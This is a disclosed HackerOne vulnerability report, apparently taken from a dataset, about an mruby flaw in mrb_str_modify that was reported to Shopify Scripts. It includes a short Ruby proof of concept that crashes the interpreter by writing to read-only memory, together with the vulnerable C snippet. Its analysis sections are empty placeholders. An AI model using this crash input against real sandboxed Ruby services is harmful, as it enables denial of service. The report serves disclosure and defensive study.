---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '193077'
original_report_id: '193077'
title: mrb_str_modify try to write to memory not marked for writing
weakness: Uncontrolled Resource Consumption
team_handle: shopify-scripts
created_at: '2016-12-21T14:34:40.465Z'
disclosed_at: '2017-02-06T22:33:47.458Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- uncontrolled-resource-consumption
---

# mrb_str_modify try to write to memory not marked for writing

## Metadata

- HackerOne Report ID: 193077
- Weakness: Uncontrolled Resource Consumption
- Program: shopify-scripts
- Disclosed At: 2017-02-06T22:33:47.458Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The proof-of-concept below can be used to crash the interpreter (DoS) because forces it to try to write a memory not marked for writing.
```
a = Time.new.zone
a.rstrip!
GC.start
a.next!
```

Code
https://github.com/mruby/mruby/blob/5289b4ba117e66bdef1438ca754c894508a2447b/src/string.c#L668
```
    if (shared->refcnt == 1 && s->as.heap.ptr == shared->ptr) {
      s->as.heap.ptr = shared->ptr;
      s->as.heap.aux.capa = shared->len;
      RSTR_PTR(s)[s->as.heap.len] = '\0';
      mrb_free(mrb, shared);
    }
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
